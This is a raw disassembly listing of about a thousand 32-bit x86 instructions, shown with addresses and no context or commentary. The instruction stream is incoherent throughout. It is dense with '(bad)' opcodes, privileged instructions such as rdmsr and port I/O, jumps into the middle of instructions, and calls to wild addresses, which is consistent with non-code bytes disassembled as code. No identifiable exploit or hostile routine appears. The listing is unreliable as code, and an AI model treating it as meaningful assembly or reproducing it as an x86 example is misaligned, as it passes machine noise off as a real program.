  431ac2:	add    cl,BYTE PTR [esi]
  431ac4:	div    DWORD PTR [edi+0x4d8b0c1c]
  431aca:	test   edi,edi
  431acc:	je     0x431ac2
  431ace:	mov    eax,ecx
  431ad0:	or     BYTE PTR [ebx],al
  431ad2:	dec    BYTE PTR [ecx+0x7d3bec7d]
  431ad8:	jbe    0x431b4c
  431ada:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  431ae0:	add    ecx,DWORD PTR [esi]
  431ae2:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  431ae8:	add    eax,DWORD PTR [ebx-0x287af783]
  431aee:	je     0x431b3d
  431af0:	mov    DWORD PTR [ecx],edi
  431af2:	mov    esi,eax
  431af4:	hlt    
  431af5:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  431afc:	jb     0x431abe
  431afe:	jmp    0x431aeb
  431b00:	xor    esi,DWORD PTR [ebx]
  431b02:	pop    edi
  431b03:	pop    esi
  431b04:	pop    ebx
  431b05:	ret    
  431b06:	ret    0x8b
  431b09:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  431b0f:	xor    DWORD PTR [ecx],0xc
  431b12:	pushf  
  431b13:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  431b19:	rdmsr  
  431b1b:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  431b22:	dec    ebp
  431b23:	ret    
  431b24:	mov    edi,DWORD PTR [esi-0x4]
  431b27:	pop    eax
  431b28:	dec    ebp
  431b29:	jne    0x431ab6
  431b2b:	xor    edi,esp
  431b2d:	inc    eax
  431b2e:	dec    ebp
  431b2f:	jbe    0x431b84
  431b31:	inc    eax
  431b32:	pop    ebp
  431b33:	add    edx,DWORD PTR [esi+0x8]
  431b36:	push   esp
  431b37:	dec    eax
  431b38:	push   ecx
  431b39:	mov    eax,edi
  431b3b:	and    al,0xf0
  431b3d:	jo     0x431b2a
  431b3f:	mov    eax,DWORD PTR [ebx]
  431b41:	sbb    BYTE PTR [ebp+0x4d],cl
  431b44:	mov    eax,DWORD PTR [ebx]
  431b46:	nop
  431b47:	or     BYTE PTR [eax],al
  431b49:	jne    0x431ba2
  431b4b:	cmp    ebx,DWORD PTR [ebx+0x33893277]
  431b51:	cld    
  431b52:	xor    edi,edi
  431b54:	add    edi,DWORD PTR [ebp+0x3]
  431b57:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  431b5d:	js     0x431ae3
  431b5f:	jae    0x431b63
  431b61:	(bad)  
  431b63:	xor    al,0x5d
  431b65:	jmp    0x431af2
  431b67:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  431b6e:	fdecstp 
  431b70:	test   BYTE PTR [edi],ah
  431b72:	add    bh,BYTE PTR [ebp+0x0]
  431b75:	add    ebx,DWORD PTR [ebp-0x77]
  431b78:	mov    edi,eax
  431b7a:	cmp    al,0x0
  431b7d:	adc    dh,BYTE PTR [ebx]
  431b7f:	jge    0x431b84
  431b81:	mov    edi,DWORD PTR [ebx]
  431b83:	jl     0x431b94
  431b85:	clc    
  431b86:	dec    edi
  431b87:	jge    0x431b89
  431b89:	mov    eax,DWORD PTR [ebx]
  431b8b:	jb     0x431b95
  431b8d:	mov    ecx,DWORD PTR [ebp-0x8]
  431b90:	mov    edi,edi
  431b92:	xor    edx,DWORD PTR [eax]
  431b94:	add    edi,DWORD PTR [ebx]
  431b96:	mov    DWORD PTR [ebp-0x10],edi
  431b99:	inc    edi
  431b9a:	pop    ebp
  431b9b:	jge    0x431bd8
  431b9d:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  431ba1:	mov    edx,0xc05d87f0
  431ba6:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  431baa:	fimul  WORD PTR [eax]
  431bac:	fist   WORD PTR [ebp+0x1c]
  431baf:	in     al,dx
  431bb0:	jne    0x431b9e
  431bb2:	mov    edi,DWORD PTR [edx-0x7a27a10]
  431bb8:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  431bbc:	fdivp  st(0),st
  431bbe:	fild   WORD PTR [ebp+0x4510f85c]
  431bc4:	test   BYTE PTR [ebx+0x4d00fc02],cl
  431bca:	inc    ebp
  431bcb:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  431bd1:	mov    ebp,DWORD PTR [ebx-0x4]
  431bd4:	adc    al,0x8b
  431bd6:	rcl    DWORD PTR [eax],0x48
  431bd9:	mov    esi,0x7080803
  431bde:	fiadd  WORD PTR [ebp+0x4d]
  431be1:	(bad)  
  431be2:	mov    edx,DWORD PTR [edx-0x4]
  431be5:	mov    edx,DWORD PTR [ebp-0x4]
  431be8:	xor    ebx,DWORD PTR [ebx+0x330103]
  431bee:	mov    DWORD PTR [edi+0x872dc],edi
  431bf4:	xlat   BYTE PTR ds:[ebx]
  431bf5:	into   
  431bf6:	ffreep st(6)
  431bf8:	retf   0x6c7
  431bfb:	iret   
  431bfc:	dec    ebp
  431bfd:	inc    ebp
  431bfe:	mov    DWORD PTR [ebx],edi
  431c00:	fmul   QWORD PTR [edi]
  431c02:	dec    ebp
  431c03:	jnp    0x431c38
  431c05:	add    BYTE PTR [ebx],al
  431c07:	mov    ecx,DWORD PTR [esp+edi*8]
  431c0a:	inc    ebp
  431c0b:	dec    ebp
  431c0c:	lea    esi,[ebx]
  431c0e:	add    DWORD PTR [ebx],eax
  431c10:	jb     0x431c4d
  431c12:	add    BYTE PTR [edi],cl
  431c14:	inc    ebp
  431c15:	imul   eax,edi,0x858bd800
  431c1b:	cld    
  431c1c:	clc    
  431c1d:	mov    DWORD PTR [ebp+0x0],eax
  431c20:	inc    DWORD PTR [eax]
  431c22:	or     al,0xde
  431c24:	sbb    bh,0x1
  431c27:	retf   
  431c28:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  431c2f:	dec    ebp
  431c30:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  431c36:	enter  0x12de,0xdf
  431c3a:	inc    ebp
  431c3b:	pop    ebp
  431c3c:	dec    DWORD PTR [ebx-0x257f0ff4]
  431c42:	add    DWORD PTR [edx],edx
  431c44:	add    BYTE PTR [ebp+0x50],dl
  431c47:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  431c4d:	xor    ecx,DWORD PTR [edx-0x38c699fd]
  431c53:	or     ah,al
  431c55:	pop    ss
  431c56:	cdq    
  431c57:	push   ebp
  431c58:	clc    
  431c59:	mov    eax,DWORD PTR [ebp-0x4]
  431c5c:	xor    edx,edx
  431c5e:	add    esi,DWORD PTR [ebx]
  431c60:	cmp    eax,DWORD PTR [ebx]
  431c62:	hlt    
  431c63:	cmp    DWORD PTR [ebx],esp
  431c65:	or     al,BYTE PTR [ebp+0xf]
  431c68:	mov    eax,DWORD PTR [edx]
  431c6a:	loopne 0x431c6c
  431c6c:	(bad)  
  431c6d:	mov    ecx,esi
  431c6f:	cld    
  431c70:	pushf  
  431c71:	pop    ebp
  431c72:	fwait
  431c73:	mov    esi,DWORD PTR [edx]
  431c75:	lock mov eax,eax
  431c78:	adc    BYTE PTR [ebx],al
  431c7a:	or     BYTE PTR [ebx+0x4d001001],0xcf
  431c81:	xor    ebp,DWORD PTR [edi+0x50e45189]
  431c87:	dec    ebp
  431c88:	mov    ecx,DWORD PTR [ebx-0x31390304]
  431c8e:	(bad)  
  431c8f:	iret   
  431c90:	inc    ebp
  431c91:	(bad)  
  431c92:	jne    0x431ce1
  431c94:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  431c9a:	(bad)  
  431c9b:	cmp    ebx,eax
  431c9d:	je     0x431c25
  431c9f:	add    edi,edi
  431ca1:	or     bh,bh
  431ca3:	dec    ebp
  431ca4:	inc    ebp
  431ca5:	mov    esi,DWORD PTR [ebx]
  431ca7:	cld    
  431ca8:	add    ecx,esi
  431caa:	cmp    ecx,DWORD PTR [eax-0xc]
  431cad:	mov    edx,DWORD PTR [edi]
  431caf:	or     BYTE PTR [ebp-0x7c],al
  431cb2:	mov    ebx,DWORD PTR [ebx-0x7639cd18]
  431cb8:	test   BYTE PTR [ebx+ebx*4],cl
  431cbb:	inc    ebp
  431cbc:	xor    bh,BYTE PTR [esi]
  431cbe:	mov    DWORD PTR [eax+ebp*8+0x10ef8b],ebx
  431cc5:	jne    0x431c8e
  431cc7:	mov    ebp,esp
  431cc9:	fcomp  DWORD PTR [ebx]
  431ccb:	add    BYTE PTR [ecx],al
  431ccd:	inc    DWORD PTR [ebp-0x75]
  431cd0:	(bad)  
  431cd1:	cld    
  431cd2:	add    al,0xce
  431cd4:	mov    ecx,edi
  431cd6:	cld    
  431cd7:	inc    ebp
  431cd8:	fidivr WORD PTR [ebx]
  431cda:	fbstp  TBYTE PTR [ebp-0x3e]
  431cdd:	mov    eax,DWORD PTR [eax]
  431cdf:	adc    BYTE PTR [ebx-0x3974038b],cl
  431ce5:	fadd   st,st(7)
  431ce7:	add    BYTE PTR [ebp-0x1],al
  431cea:	mov    ecx,DWORD PTR [esp+edi*8]
  431ced:	inc    ebp
  431cee:	mov    bh,0xc7
  431cf1:	loopne 0x431d38
  431cf3:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  431cf9:	sbb    dh,BYTE PTR [ebx]
  431cfb:	pushf  
  431cfc:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  431d02:	mov    eax,edi
  431d04:	cwde   
  431d05:	inc    ebp
  431d06:	inc    ebp
  431d07:	jne    0x431c94
  431d09:	mov    esp,esp
  431d0b:	clc    
  431d0c:	add    al,0x4d
  431d0e:	mov    DWORD PTR [ebx],esi
  431d10:	or     al,0x33
  431d12:	inc    ebp
  431d13:	lea    ecx,[ebx-0x398d13fd]
  431d19:	add    bh,al
  431d1b:	inc    ebp
  431d1c:	ror    DWORD PTR [ebx+0x45d829],0x8b
  431d23:	add    ebp,esp
  431d25:	shufps xmm1,xmm3,0xc7
  431d29:	(bad)  
  431d2a:	jmp    0x74885853
  431d2f:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  431d35:	hlt    
  431d36:	mov    ecx,DWORD PTR [edi]
  431d38:	fadd   DWORD PTR [ebp+0x0]
  431d3b:	xor    ecx,DWORD PTR [edi]
  431d3d:	add    ecx,ecx
  431d3f:	cmp    edi,edi
  431d41:	pmuludq mm7,QWORD PTR [edx+0x50]
  431d45:	(bad)  
  431d46:	jmp    0x431cd3
  431d48:	mov    edi,esp
  431d4a:	or     al,0xc6
  431d4c:	inc    ebp
  431d4d:	(bad)  
  431d4e:	mov    eax,DWORD PTR [ebp+0x10]
  431d51:	jne    0x431cdc
  431d53:	mov    eax,DWORD PTR [ecx]
  431d55:	clc    
  431d56:	add    BYTE PTR [ebp-0x40],cl
  431d59:	xor    edx,DWORD PTR [eax-0x73]
  431d5c:	jne    0x431d5f
  431d5e:	push   DWORD PTR [edx+0x8]
  431d61:	add    BYTE PTR [ebp+0x45],al
  431d64:	mov    ebp,ecx
  431d66:	cld    
  431d67:	add    BYTE PTR [ebp+0x0],cl
  431d6a:	xor    eax,DWORD PTR [ebp+0x3]
  431d6d:	mov    DWORD PTR [ebx],edi
  431d6f:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  431d75:	sub    eax,0x5d330e4d
  431d7a:	lea    esi,[ebx]
  431d7c:	add    DWORD PTR [ebx],eax
  431d7e:	jb     0x431d69
  431d80:	add    BYTE PTR [eax],al
  431d82:	inc    ebp
  431d83:	add    bl,ch
  431d85:	inc    ebp
  431d86:	mov    esi,DWORD PTR [ebx]
  431d88:	or     al,0x3
  431d8a:	(bad)  
  431d8b:	mov    edi,eax
  431d8d:	in     al,dx
  431d8e:	scas   eax,DWORD PTR es:[edi]
  431d8f:	inc    ebp
  431d90:	mov    esi,DWORD PTR [ebx]
  431d92:	in     al,0x3
  431d94:	add    al,0x89
  431d96:	mov    ecx,DWORD PTR [eax+edi*8]
  431d99:	dec    ebp
  431d9a:	(bad)  
  431d9b:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3165]
  431da2:	mov    ecx,eax
  431da4:	cld    
  431da5:	push   es
  431da6:	dec    ebp
  431da7:	add    al,0x33
  431da9:	mov    DWORD PTR [ebx],eax
  431dab:	in     al,dx
  431dac:	cmp    DWORD PTR [ebp-0x67],eax
  431daf:	mov    eax,DWORD PTR [ebp-0xba0068]
  431db5:	mov    edx,DWORD PTR [ebp-0x4]
  431db8:	mov    ecx,DWORD PTR [ebp-0x2c]
  431dbb:	xor    eax,DWORD PTR [ebp+0x3]
  431dbe:	cmp    DWORD PTR [ebx],0x8b32749a
  431dc4:	xor    edi,esp
  431dc6:	jmp    0xff771b18
  431dcb:	add    ecx,DWORD PTR [ebp-0x3f]
  431dce:	xor    ebx,DWORD PTR [edi]
  431dd0:	add    eax,ecx
  431dd2:	cmp    ebx,DWORD PTR [eax]
  431dd4:	mov    ecx,DWORD PTR [ebp-0x4]
  431dd7:	mov    ecx,DWORD PTR [eax]
  431dd9:	adc    BYTE PTR [ebp-0x80],al
  431ddc:	jmp    0x431ddf
  431dde:	mov    eax,DWORD PTR [eax]
  431de0:	cld    
  431de1:	mov    bh,0xc6
  431de3:	push   ecx
  431de4:	(bad)  
  431de5:	jne    0x431e45
  431de7:	dec    ecx
  431de9:	or     BYTE PTR [ecx+ebx*1],cl
  431dec:	push   ebp
  431ded:	inc    ebp
  431dee:	in     al,dx
  431def:	add    ebp,esp
  431df1:	or     bh,al
  431df3:	dec    ebp
  431df4:	cld    
  431df5:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  431dfb:	xor    DWORD PTR [edx],0x2
  431dfe:	pushf  
  431dff:	dec    DWORD PTR [ebx+0x45510cf4]
  431e05:	mov    DWORD PTR [ebx+0x5445fc0c],ecx
  431e0b:	mov    edx,DWORD PTR [ecx+0xc]
  431e0e:	xor    eax,esi
  431e10:	mov    edx,0xc172c7
  431e15:	inc    ebp
  431e16:	mov    esi,DWORD PTR [ebp+0x8]
  431e19:	mov    eax,edx
  431e1b:	call   0x84c7e510
  431e20:	add    DWORD PTR [ebx-0x76bace00],ebx
  431e26:	mov    ebp,eax
  431e28:	or     BYTE PTR [eax],dl
  431e2a:	jo     0x431e79
  431e2c:	push   edi
  431e2d:	xor    esi,DWORD PTR [ebp+0x3]
  431e30:	(bad)  
  431e31:	pmulhuw mm0,mm1
  431e34:	test   DWORD PTR [ebp-0x8],ecx
  431e37:	mov    DWORD PTR [ebp-0x67],eax
  431e3a:	mov    eax,DWORD PTR [ebp-0x4]
  431e3d:	xor    edi,DWORD PTR [ebp-0x73]
  431e40:	xor    eax,DWORD PTR [ebx]
  431e42:	xor    esi,DWORD PTR [edx+0x3]
  431e45:	add    BYTE PTR [ecx],bh
  431e47:	inc    ebp
  431e48:	(bad)  
  431e49:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  431e4f:	mov    DWORD PTR [eax],0x750f0004
  431e55:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  431e5b:	lock add BYTE PTR [ebp+0x0],cl
  431e5f:	mov    esi,DWORD PTR [ebp-0x18]
  431e62:	mov    ebp,edx
  431e64:	or     al,0x72
  431e66:	ja     0x431e68
  431e68:	mov    edx,esi
  431e6a:	cld    
  431e6b:	(bad)  
  431e6e:	cli    
  431e6f:	mov    esi,DWORD PTR [ebp-0x4]
  431e72:	cmp    ecx,esi
  431e74:	bswap  edi
  431e76:	(bad)
  431e7a:	mov    esi,DWORD PTR [ebp-0x4]
  431e7d:	mov    esi,ecx
  431e7f:	clc    
  431e80:	repnz add esi,DWORD PTR [ebp+0x45]
  431e84:	push   ebx
  431e85:	xor    eax,DWORD PTR [ebp+0x3]
  431e88:	cmp    al,0x5f
  431e8a:	pushf  
  431e8b:	pop    ebx
  431e8c:	jmp    0x431f53
  431e91:	mov    esi,DWORD PTR [ebp-0x7d]
  431e94:	xor    ebp,DWORD PTR [eax]
  431e96:	lea    eax,[ebp-0x8]
  431e99:	xor    edx,esi
  431e9b:	pushf  
  431e9c:	out    dx,eax
  431e9d:	(bad)  
  431e9e:	neg    eax
  431ea0:	ins    DWORD PTR es:[edi],dx
  431ea1:	test   esi,edi
  431ea3:	clc    
  431ea4:	pop    esp
  431ea5:	inc    ebp
  431ea6:	or     BYTE PTR [ecx+0x450f0c7d],cl
  431eac:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  431eb2:	add    cl,al
  431eb4:	jne    0x431e51
  431eb6:	mov    esi,DWORD PTR [edx]
  431eb8:	in     al,dx
  431eb9:	push   esi
  431eba:	xor    BYTE PTR [ebp-0xe],dh
  431ebd:	add    edi,esi
  431ebf:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  431ec5:	add    cl,bh
  431ec7:	mov    edi,DWORD PTR [ebp+0x8]
  431eca:	mov    DWORD PTR [ebp-0x14],esi
  431ecd:	add    esi,DWORD PTR [ebp+0x3c]
  431ed0:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  431ed6:	mov    ah,0x3e
  431ed8:	fwait
  431ed9:	pushf  
  431eda:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  431ee0:	jne    0x431e6d
  431ee2:	mov    ecx,DWORD PTR [esp+ebp*8]
  431ee5:	icebp  
  431ee6:	icebp  
  431ee7:	shl    edx,0xf2
  431eea:	(bad)  
  431eeb:	mov    ah,0x16
  431eed:	push   eax
  431eee:	jne    0x431e83
  431ef0:	mov    ecx,DWORD PTR [edi]
  431ef2:	in     al,dx
  431ef3:	jmp    0x431ee6
  431ef5:	add    dl,dh
  431ef7:	mov    edi,esi
  431ef9:	or     al,0x8
  431efb:	inc    ebp
  431efc:	jne    0x431f01
  431efe:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  431f04:	ret    
  431f05:	or     bh,bh
  431f07:	jge    0x431ef1
  431f09:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  431f0f:	xor    edi,eax
  431f11:	add    esi,DWORD PTR [ebp-0x77]
  431f14:	mov    ebx,esp
  431f16:	clc    
  431f17:	neg    DWORD PTR [ebp-0x7c]
  431f1a:	xor    eax,DWORD PTR [eax]
  431f1c:	cmp    eax,DWORD PTR [eax]
  431f1e:	repz jne 0x431eb6
  431f21:	xor    eax,DWORD PTR [ecx]
  431f23:	add    ebx,DWORD PTR [eax]
  431f25:	mov    DWORD PTR [ebp-0x8],eax
  431f28:	mov    eax,edi
  431f2a:	cld    
  431f2b:	lock pop eax
  431f2d:	test   DWORD PTR [ebx],esi
  431f2f:	clc    
  431f30:	add    edx,DWORD PTR [edi-0x740bff77]
  431f36:	fdivp  st(4),st
  431f38:	test   ecx,esi
  431f3a:	(bad)  
  431f3b:	jnp    0x431f3c
  431f3d:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  431f43:	jae    0x431ed0
  431f45:	sub    edi,esp
  431f47:	(bad)  
  431f48:	shl    DWORD PTR [eax-0x3e],0x89
  431f4c:	leave  
  431f4d:	call   0x8198d65a
  431f52:	in     al,dx
  431f53:	(bad)  
  431f54:	in     al,dx
  431f55:	add    bh,al
  431f57:	mov    esp,edi
  431f59:	in     al,dx
  431f5a:	test   DWORD PTR [ebp-0x8],edi
  431f5d:	mov    eax,DWORD PTR [ebp+0x2b]
  431f60:	xor    al,BYTE PTR [ebx]
  431f62:	pushf  
  431f63:	jnp    0x57321b9c
  431f69:	xor    edx,DWORD PTR [ecx+ecx*4+0x51]
  431f6d:	loopne 0x431fa2
  431f6f:	jne    0x431f2c
  431f71:	mov    esi,DWORD PTR [edx-0x20]
  431f74:	add    BYTE PTR [ebp-0x3d],bh
  431f77:	xor    eax,DWORD PTR [ebp-0x73]
  431f7a:	mov    edi,DWORD PTR [esi]
  431f7c:	cld    
  431f7d:	jb     0x431f45
  431f7f:	add    bl,al
  431f81:	jne    0x431fc8
  431f83:	mov    edx,DWORD PTR [edi-0x10]
  431f86:	jge    0x432005
  431f88:	mov    esi,DWORD PTR [ebx]
  431f8a:	lock add ecx,DWORD PTR [ebp+0x3b]
  431f8e:	xor    esi,DWORD PTR [ebp-0x77]
  431f91:	mov    esi,eax
  431f93:	lock inc ebp
  431f95:	jge    0x431fc8
  431f97:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  431f9e:	dec    ebp
  431f9f:	mov    esi,DWORD PTR [ebx]
  431fa1:	loopne 0x431f2c
  431fa3:	jge    0x431f9d
  431fa5:	add    DWORD PTR [ebp-0x7d],eax
  431fa8:	icebp  
  431fa9:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  431fb0:	dec    ebp
  431fb1:	hlt    
  431fb2:	xor    ebx,DWORD PTR [ebp-0x77]
  431fb5:	mov    esi,esp
  431fb7:	in     al,0x45
  431fb9:	jge    0x431ff8
  431fbb:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  431fc2:	dec    ebp
  431fc3:	push   esp
  431fc4:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  431fca:	inc    ebp
  431fcb:	hlt    
  431fcc:	xor    DWORD PTR [ebp-0x61],esi
  431fcf:	mov    edi,DWORD PTR [eax+0xf19504]
  431fd5:	repnz mov DWORD PTR [ebp+0x20],ebx
  431fd9:	cmp    eax,DWORD PTR [ebp+0xf]
  431fdc:	test   DWORD PTR [edi+ecx*1-0x1],edx
  431fe0:	fistp  WORD PTR [ebx+0x0]
  431fe3:	inc    ebp
  431fe4:	mov    ebx,DWORD PTR [edi+0xc]
  431fe7:	add    eax,eax
  431fe9:	inc    ebp
  431fea:	test   BYTE PTR [ebx],dh
  431fec:	add    eax,DWORD PTR [ebx]
  431fee:	add    BYTE PTR [esi+0x45],bl
  431ff1:	ret    0x85
  431ff4:	jnp    0x5443a3c3
  431ffa:	inc    bp
  431ffc:	inc    ebp
  431ffd:	xor    DWORD PTR [ecx+0xc78a9c],edi
  432003:	fdiv   QWORD PTR [ebx]
  432005:	test   DWORD PTR [ecx+0x453bf8],edi
  43200b:	push   ebx
  43200c:	add    edi,DWORD PTR [esi+0x708088b]
  432012:	cmp    esi,eax
  432014:	setnp  BYTE PTR [ecx-0x74fcffce]
  43201b:	mov    esp,edi
  43201d:	call   0x33ce656f
  432022:	or     BYTE PTR [ebx],al
  432024:	inc    ecx
  432025:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  43202b:	and    BYTE PTR [ebp-0x7074f0bb],al
  432031:	lock add cl,al
  432034:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  43203b:	mov    ch,0x45
  43203d:	clc    
  43203e:	xor    eax,DWORD PTR [ebp+0x3]
  432041:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  432047:	inc    ebp
  432048:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  43204e:	mov    edi,eax
  432050:	mov    eax,DWORD PTR [ebp+0x3c]
  432053:	mov    ecx,DWORD PTR [eax]
  432055:	hlt    
  432056:	inc    ebp
  432057:	ror    DWORD PTR [ebx+0x818c45],0xf4
  43205e:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  432064:	push   ebp
  432065:	mov    edi,DWORD PTR [ebx]
  432067:	in     al,dx
  432068:	jne    0x43202b
  43206a:	mov    eax,DWORD PTR [ebp-0x28]
  43206d:	add    DWORD PTR [eax],0xe8058dec
  432073:	clc    
  432074:	mov    esi,DWORD PTR [edi-0x8]
  432077:	add    dh,dl
  432079:	rol    WORD PTR [ebp-0x1],cl
  43207d:	mov    edx,DWORD PTR [eax+0x8]
  432080:	jne    0x432042
  432082:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  432089:	inc    ebp
  43208a:	push   esp
  43208b:	test   DWORD PTR [ecx+0xf],ecx
  43208e:	sub    edx,esp
  432090:	add    eax,DWORD PTR [eax]
  432092:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  432098:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  43209f:	mov    eax,DWORD PTR [ecx]
  4320a1:	and    BYTE PTR [eax],al
  4320a3:	cmp    al,0x10
  4320a5:	add    BYTE PTR [ebp+0x66],al
  4320a8:	inc    ecx
  4320aa:	push   esp
  4320ab:	add    dh,BYTE PTR [ebp+0x0]
  4320ae:	push   edx
  4320af:	enterw 0xc1,0x4d
  4320b4:	mov    esp,DWORD PTR [esi+0x20]
  4320b7:	add    DWORD PTR [ecx-0x7b],eax
  4320ba:	add    eax,DWORD PTR [ebx]
  4320bc:	str    WORD PTR [eax+0x45]
  4320c0:	lea    ecx,[ebx+0x45890801]
  4320c6:	sbb    BYTE PTR [ebx],al
  4320c8:	dec    ebp
  4320c9:	cmp    al,0xf
  4320cb:	inc    ebp
  4320cc:	push   eax
  4320cd:	mov    esi,DWORD PTR [ebx]
  4320cf:	push   eax
  4320d0:	add    eax,eax
  4320d2:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  4320d9:	inc    ebp
  4320da:	add    BYTE PTR [ecx],dh
  4320dc:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  4320e3:	(bad)  
  4320e4:	mov    ebx,eax
  4320e6:	loopne 0x43212d
  4320e8:	dec    ebp
  4320e9:	mov    ecx,DWORD PTR [edi]
  4320eb:	cld    
  4320ec:	push   eax
  4320ed:	xchg   DWORD PTR [ebx],esi
  4320ef:	add    DWORD PTR [ebx],ebp
  4320f1:	add    BYTE PTR [ebx],ch
  4320f3:	or     BYTE PTR [ecx],bh
  4320f5:	dec    ecx
  4320f6:	loopne 0x4320fb
  4320f8:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  4320fe:	push   ebp
  4320ff:	add    DWORD PTR [ebx+0x55100800],eax
  432105:	dec    ebp
  432106:	jmp    0x432091
  432108:	mov    esp,DWORD PTR [eax]
  43210a:	sbb    dl,dl
  43210c:	inc    eax
  43210d:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  432113:	add    BYTE PTR [ebx+0x74528555],cl
  432119:	push   ebp
  43211a:	div    DWORD PTR [ebx]
  43211c:	and    eax,DWORD PTR [ebx]
  43211e:	add    edx,DWORD PTR [edx-0x30]
  432121:	jno    0x4320ae
  432123:	inc    DWORD PTR [eax+eiz*1]
  432126:	inc    ebp
  432127:	push   eax
  432128:	push   eax
  432129:	mov    esp,DWORD PTR [edi-0x74beff1c]
  43212f:	mov    edi,esp
  432131:	push   eax
  432132:	inc    ebp
  432133:	enter  0x458b,0x8
  432137:	push   ecx
  432138:	(bad)  
  432139:	call   0x10d2b11
  43213e:	pop    ss
  43213f:	push   ebp
  432140:	mov    ecx,DWORD PTR [ebx+0x489408]
  432146:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  43214c:	push   ecx
  43214d:	jo     0x432137
  43214f:	inc    DWORD PTR [edi]
  432151:	or     BYTE PTR [eax],al
  432153:	call   0xce289d
  432158:	fmul   QWORD PTR [ebp+0x55]
  43215b:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  432161:	mov    bh,0x8c
  432163:	adc    al,0x9b
  432165:	dec    esp
  432166:	xor    bl,BYTE PTR [eax]
  432168:	mov    ecx,DWORD PTR [ebp+0xc]
  43216b:	mov    eax,DWORD PTR [ebp-0x4]
  43216e:	mov    esi,DWORD PTR [edi-0x3148f924]
  432174:	push   es
  432175:	retf   
  432176:	mov    BYTE PTR [ebp-0x30],0x3b
  43217a:	inc    ebp
  43217b:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  432182:	retf   0x83fc
  432185:	into   
  432186:	dec    ebp
  432187:	retf   
  432188:	mov    ecx,DWORD PTR [ebp-0x74]
  43218b:	mov    eax,DWORD PTR [eax]
  43218d:	fdiv   QWORD PTR [ebx]
  43218f:	mov    bh,0x3
  432191:	push   es
  432192:	mov    esi,ecx
  432194:	sbb    cl,dl
  432196:	dec    ebp
  432197:	sar    DWORD PTR [ebx],cl
  432199:	push   ebp
  43219a:	jne    0x4321ab
  43219c:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  4321a2:	lea    ebx,[eax]
  4321a4:	call   0xf4ccad6b
  4321a9:	sbb    dh,dl
  4321ab:	add    edx,ebx
  4321ad:	push   ebp
  4321ae:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  4321b4:	push   ecx
  4321b5:	mov    DWORD PTR [eax-0x30],edx
  4321b8:	test   DWORD PTR [edx],eax
  4321ba:	xadd   esp,esi
  4321bd:	pop    es
  4321be:	add    cl,dl
  4321c0:	mov    eax,ecx
  4321c2:	or     al,0x45
  4321c4:	(bad)  
  4321c5:	push   eax
  4321c6:	add    DWORD PTR [edx+0x0],eax
  4321c9:	add    ecx,DWORD PTR [ecx]
  4321cb:	and    dh,cl
  4321cd:	call   0xc72a9d
  4321d2:	add    DWORD PTR [ebp+0x0],edx
  4321d5:	mov    esp,DWORD PTR [ebp+0x18]
  4321d8:	add    BYTE PTR [eax+0x50],cl
  4321db:	xor    eax,DWORD PTR [eax]
  4321dd:	add    esp,DWORD PTR [esi+0x3b]
  4321e0:	inc    ebp
  4321e1:	je     0x432166
  4321e3:	push   ecx
  4321e4:	dec    BYTE PTR [ebp-0x77]
  4321e7:	add    eax,esi
  4321e9:	or     al,0x5e
  4321eb:	inc    eax
  4321ec:	add    BYTE PTR [ebx],al
  4321ee:	data16 and BYTE PTR [ebp+0x50],al
  4321f2:	sub    DWORD PTR [ecx],0xfffffff8
  4321f5:	add    BYTE PTR [ebp-0x75],ah
  4321f8:	add    BYTE PTR [eax],bl
  4321fa:	enter  0x894d,0x8b
  4321fe:	int3   
  4321ff:	loopne 0x4321c3
  432201:	rol    BYTE PTR [eax],0x33
  432204:	lea    cx,[ebp+0xa]
  432208:	data16 jb 0x432250
  43220b:	add    BYTE PTR [ebx+0x44890855],cl
  432211:	sbb    ah,al
  432213:	inc    ebp
  432214:	cmp    al,0xf
  432216:	add    BYTE PTR [edx+0x66],dl
